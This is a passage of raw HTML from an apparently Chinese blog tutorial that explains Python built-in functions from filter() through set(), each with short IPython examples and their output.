class="hljs-string">"exec"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">76</span>]: r</span><br><span class="line">Out[<span class="hljs-number">76</span>]: &lt;code object &lt;module&gt; at <span class="hljs-number">0x0000000005DE75D0</span>, file <span class="hljs-string">"&lt;string&gt;"</span>, line <span class="hljs-number">1</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">77</span>]: exec(r)</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure><p>24 filter()　　</p><p>过滤器，构造一个序列，等价于</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> iterables <span class="hljs-keyword">if</span> function(item)]</span><br></pre></td></tr></table></figure><p>在函数中设定过滤条件，逐一循环迭代器中的元素，将返回值为True时的元素留下，形成一个filter类型数据。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">101</span>]: fil = filter(<span class="hljs-keyword">lambda</span> x: x&gt;<span class="hljs-number">10</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">45</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">102</span>]: list(fil)</span><br><span class="line">Out[<span class="hljs-number">102</span>]: [<span class="hljs-number">11</span>, <span class="hljs-number">45</span>, <span class="hljs-number">13</span>]</span><br></pre></td></tr></table></figure><p>25 float()　　</p><p>将一个字符串或整数转换为浮点数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">103</span>]: float(<span class="hljs-number">3</span>)</span><br><span class="line">Out[<span class="hljs-number">103</span>]: <span class="hljs-number">3.0</span></span><br></pre></td></tr></table></figure><p>26 format()　　</p><p>格式化输出字符串，format(value, format_spec)实质上是调用了value的format(format_spec)方法。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">104</span>]: print(<span class="hljs-string">"i am &#123;0&#125;,age&#123;1&#125;"</span>.format(<span class="hljs-string">"tom"</span>,<span class="hljs-number">18</span>))</span><br><span class="line">i am tom,age18</span><br></pre></td></tr></table></figure><p>27 frozenset()　<br>　<br>创建一个不可修改的集合。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">105</span>]: frozenset([<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])</span><br><span class="line">Out[<span class="hljs-number">105</span>]: frozenset(&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;)</span><br></pre></td></tr></table></figure><p>28 getattr()　<br>　<br>获取对象的属性</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">106</span>]: getattr(xiaoming,<span class="hljs-string">'name'</span>)</span><br><span class="line">Out[<span class="hljs-number">106</span>]: <span class="hljs-string">'xiaoming'</span></span><br></pre></td></tr></table></figure><p>29 globals()　　</p><p>返回一个描述当前全局变量的字典</p><p>30 hasattr()</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">110</span>]: hasattr(xiaoming,<span class="hljs-string">'name'</span>)</span><br><span class="line">Out[<span class="hljs-number">110</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">111</span>]: hasattr(xiaoming,<span class="hljs-string">'id'</span>)</span><br><span class="line">Out[<span class="hljs-number">111</span>]: <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure><p>31 hash()　　</p><p>返回对象的哈希值</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">112</span>]: hash(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">112</span>]: <span class="hljs-number">6139638</span></span><br></pre></td></tr></table></figure><p>32 help()　　</p><p>返回对象的帮助文档</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">113</span>]: help(xiaoming)</span><br><span class="line">Help on Student <span class="hljs-keyword">in</span> module __main__ object:</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">(builtins.object)</span></span></span><br><span class="line"><span class="hljs-class"> |  <span class="hljs-title">Methods</span> <span class="hljs-title">defined</span> <span class="hljs-title">here</span>:</span></span><br><span class="line"> |</span><br><span class="line"> |  __init__(self, id, name)</span><br><span class="line"> |</span><br><span class="line"> |  __repr__(self)</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |</span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary <span class="hljs-keyword">for</span> instance variables (<span class="hljs-keyword">if</span> defined)</span><br><span class="line"> |</span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      list of weak references to the object (<span class="hljs-keyword">if</span> defined)</span><br></pre></td></tr></table></figure><p>33 id()　　</p><p>返回对象的内存地址</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">115</span>]: id(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">115</span>]: <span class="hljs-number">98234208</span></span><br></pre></td></tr></table></figure><p>34 input()　<br>　<br>获取用户输入内容</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">116</span>]: input()</span><br><span class="line">aa</span><br><span class="line">Out[<span class="hljs-number">116</span>]: <span class="hljs-string">'aa'</span></span><br></pre></td></tr></table></figure><p>35  int()　<br>　<br>int(x, base =10) , x可能为字符串或数值，将x 转换为一个普通整数。如果参数是字符串，那么它可能包含符号和小数点。如果超出了普通整数的表示范围，一个长整数被返回。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">120</span>]: int(<span class="hljs-string">'12'</span>,<span class="hljs-number">16</span>)</span><br><span class="line">Out[<span class="hljs-number">120</span>]: <span class="hljs-number">18</span></span><br></pre></td></tr></table></figure><p>36  isinstance(object, classinfo)</p><p>判断object是否为类classinfo的实例，是返回true</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">20</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    ...:     ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,id,name)</span>:</span></span><br><span class="line">    ...:     ...:         self.id = id</span><br><span class="line">    ...:     ...:         self.name = name</span><br><span class="line">    ...:     ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:     ...:         <span class="hljs-keyword">return</span> <span class="hljs-string">'id = '</span>+self.id +<span class="hljs-string">', name = '</span>+self.name</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">21</span>]: xiaoming = Student(<span class="hljs-string">'001'</span>,<span class="hljs-string">'xiaoming'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">22</span>]: isinstance(xiaoming,Student)</span><br><span class="line">Out[<span class="hljs-number">22</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>37 issubclass(class, classinfo)</p><p>如果class是classinfo类的子类，返回True：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">27</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">undergraduate</span><span class="hljs-params">(Student)</span>:</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">studyClass</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">pass</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attendActivity</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">pass</span></span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">28</span>]: issubclass(undergraduate,Student)</span><br><span class="line">Out[<span class="hljs-number">28</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">29</span>]: issubclass(object,Student)</span><br><span class="line">Out[<span class="hljs-number">29</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">30</span>]: issubclass(Student,object)</span><br><span class="line">Out[<span class="hljs-number">30</span>]: <span class="hljs-literal">True</span></span><br><span class="line">如果<span class="hljs-class"><span class="hljs-keyword">class</span>是<span class="hljs-title">classinfo</span>元组中某个元素的子类，也会返回<span class="hljs-title">True</span></span></span><br><span class="line"><span class="hljs-class"><span class="hljs-title">In</span> [26]:</span> issubclass(int,(int,float))</span><br><span class="line">Out[<span class="hljs-number">26</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>38 iter(object, sentinel)</p><p>返回一个可迭代对象, sentinel可省略</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">72</span>]: lst = [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">73</span>]: <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> iter(lst):</span><br><span class="line">    ...:     print(i)</span><br><span class="line">    ...:</span><br><span class="line"><span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">5</span></span><br><span class="line">sentinel 理解为迭代对象的哨兵，一旦迭代到此元素，立即终止：</span><br><span class="line">In [<span class="hljs-number">81</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestIter</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:             self.l=[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]</span><br><span class="line">    ...:             self.i=iter(self.l)</span><br><span class="line">    ...:         <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment">#定义了__call__方法的类的实例是可调用的</span></span><br><span class="line">    ...:             item = next(self.i)</span><br><span class="line">    ...:             <span class="hljs-keyword">print</span> (<span class="hljs-string">"__call__ is called,which would return"</span>,item)</span><br><span class="line">    ...:             <span class="hljs-keyword">return</span> item</span><br><span class="line">    ...:         <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span> <span class="hljs-comment">#支持迭代协议(即定义有__iter__()函数)</span></span><br><span class="line">    ...:             <span class="hljs-keyword">print</span> (<span class="hljs-string">"__iter__ is called!!"</span>)</span><br><span class="line">    ...:             <span class="hljs-keyword">return</span> iter(self.l)</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">82</span>]:     t = TestIter()</span><br><span class="line">    ...:     t1 = iter(t, <span class="hljs-number">3</span>)</span><br><span class="line">    ...:     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t1:</span><br><span class="line">    ...:         print(i)</span><br><span class="line">    ...:</span><br><span class="line">__call__ <span class="hljs-keyword">is</span> called,which would <span class="hljs-keyword">return</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span></span><br><span class="line">__call__ <span class="hljs-keyword">is</span> called,which would <span class="hljs-keyword">return</span> <span class="hljs-number">3</span></span><br></pre></td></tr></table></figure><p>39 len(s)</p><p>返回对象的长度（元素个数）</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">83</span>]: dic = &#123;<span class="hljs-string">'a'</span>:<span class="hljs-number">1</span>,<span class="hljs-string">'b'</span>:<span class="hljs-number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">84</span>]: len(dic)</span><br><span class="line">Out[<span class="hljs-number">84</span>]: <span class="hljs-number">2</span></span><br></pre></td></tr></table></figure><p>40 list([iterable])</p><p>返回可变序列类型</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">85</span>]: list(map(<span class="hljs-keyword">lambda</span> x: x%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>, [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>]))</span><br><span class="line">Out[<span class="hljs-number">85</span>]: [<span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>]</span><br></pre></td></tr></table></figure><p>41 map(function, iterable, …)</p><p>返回一个将 function 应用于 iterable 中每一项并输出其结果的迭代器：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">85</span>]: list(map(<span class="hljs-keyword">lambda</span> x: x%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>, [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>]))</span><br><span class="line">Out[<span class="hljs-number">85</span>]: [<span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>]</span><br></pre></td></tr></table></figure><p>可以传入多个iterable对象，输出长度等于最短序列的长度：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">88</span>]: list(map(<span class="hljs-keyword">lambda</span> x,y: x%<span class="hljs-number">2</span>==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>, [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]))</span><br><span class="line">Out[<span class="hljs-number">88</span>]: [<span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>]</span><br></pre></td></tr></table></figure><p>42 max(iterable,*[, key, default])</p><p>返回最大值：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">99</span>]: max(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)</span><br><span class="line">Out[<span class="hljs-number">99</span>]: <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">100</span>]: max((),default=<span class="hljs-number">0</span>)</span><br><span class="line">Out[<span class="hljs-number">100</span>]: <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">89</span>]: di = &#123;<span class="hljs-string">'a'</span>:<span class="hljs-number">3</span>,<span class="hljs-string">'b1'</span>:<span class="hljs-number">1</span>,<span class="hljs-string">'c'</span>:<span class="hljs-number">4</span>&#125;</span><br><span class="line">In [<span class="hljs-number">90</span>]: max(di)</span><br><span class="line">Out[<span class="hljs-number">90</span>]: <span class="hljs-string">'c'</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">102</span>]: a = [&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'xiaoming'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">18</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'male'</span>&#125;,&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">     ...: xiaohong'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">20</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'female'</span>&#125;]</span><br><span class="line">In [<span class="hljs-number">104</span>]: max(a,key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">'age'</span>])</span><br><span class="line">Out[<span class="hljs-number">104</span>]: &#123;<span class="hljs-string">'name'</span>: <span class="hljs-string">'xiaohong'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>, <span class="hljs-string">'gender'</span>: <span class="hljs-string">'female'</span>&#125;</span><br></pre></td></tr></table></figure><p>43 min(iterable,*[, key, default])</p><p>返回最小值</p><p>44 memoryview(obj)</p><p>返回由给定实参创建的“内存视图”对象， Python 代码访问一个对象的内部数据，只要该对象支持 缓冲区协议 而无需进行拷贝</p><p>45 next(iterator,[, default])</p><p>返回可迭代对象的下一个元素</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">129</span>]: it = iter([<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">130</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">130</span>]: <span class="hljs-number">5</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">131</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">131</span>]: <span class="hljs-number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">132</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">132</span>]: <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">133</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">133</span>]: <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">134</span>]: next(it,<span class="hljs-number">0</span>) <span class="hljs-comment">#迭代到头，默认返回值为0</span></span><br><span class="line">Out[<span class="hljs-number">134</span>]: <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">135</span>]: next(it)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">StopIteration                        Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="hljs-number">-135</span>-bc1ab118995a&gt; <span class="hljs-keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; 1 next(it)</span><br><span class="line"></span><br><span class="line">StopIteration:</span><br></pre></td></tr></table></figure><p>46 object()</p><p>返回一个没有特征的新对象。object 是所有类的基类。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">137</span>]: o = object()</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">138</span>]: type(o)</span><br><span class="line">Out[<span class="hljs-number">138</span>]: object</span><br></pre></td></tr></table></figure><p>mode取值表：<br><a href="https://sm.ms/image/7ydUQzZEsRiDYBL" target="_blank"><img src="https://i.loli.net/2019/11/03/7ydUQzZEsRiDYBL.png"></a></p><p>48 pow(base, exp[, mod])</p><p>base为底的exp次幂，如果mod给出，取余</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">149</span>]: pow(<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>)</span><br><span class="line">Out[<span class="hljs-number">149</span>]: <span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><p>49 print(objects)</p><p>打印对象，此函数不解释</p><p>50 class property(fget=None, fset=None, fdel=None, doc=None)</p><p>返回 property 属性，典型的用法：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self._x = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getx</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self._x</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setx</span><span class="hljs-params">(self, value)</span>:</span></span><br><span class="line">        self._x = value</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delx</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">del</span> self._x</span><br><span class="line">    <span class="hljs-comment"># 使用property类创建 property 属性</span></span><br><span class="line">    x = property(getx, setx, delx, <span class="hljs-string">"I'm the 'x' property."</span>)</span><br><span class="line">使用python装饰器，实现与上完全一样的效果代码：</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self._x = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @property</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">x</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self._x</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @x.setter</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">x</span><span class="hljs-params">(self, value)</span>:</span></span><br><span class="line">        self._x = value</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @x.deleter</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">x</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">del</span> self._x</span><br></pre></td></tr></table></figure><p>51 range(stop)</p><p>range(start, stop[,step])<br>生成一个不可变序列：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">153</span>]: range(<span class="hljs-number">11</span>)</span><br><span class="line">Out[<span class="hljs-number">153</span>]: range(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">154</span>]: range(<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)</span><br><span class="line">Out[<span class="hljs-number">154</span>]: range(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)</span><br></pre></td></tr></table></figure><p>52 reversed(seq)</p><p>返回一个反向的 iterator:</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">155</span>]: rev = reversed([<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">156</span>]: <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rev:</span><br><span class="line">     ...:     print(i)</span><br><span class="line">     ...:</span><br><span class="line"><span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><p>53 round(number[, ndigits])</p><p>四舍五入，ndigits代表小数点后保留几位：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">157</span>]: round(<span class="hljs-number">10.0222222</span>, <span class="hljs-number">3</span>)</span><br><span class="line">Out[<span class="hljs-number">157</span>]: <span class="hljs-number">10.022</span></span><br></pre></td></tr></table></figure><p>54 class set([iterable])</p><p>返回一个set对象，可实现去重：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">159</span>]: a = [<span 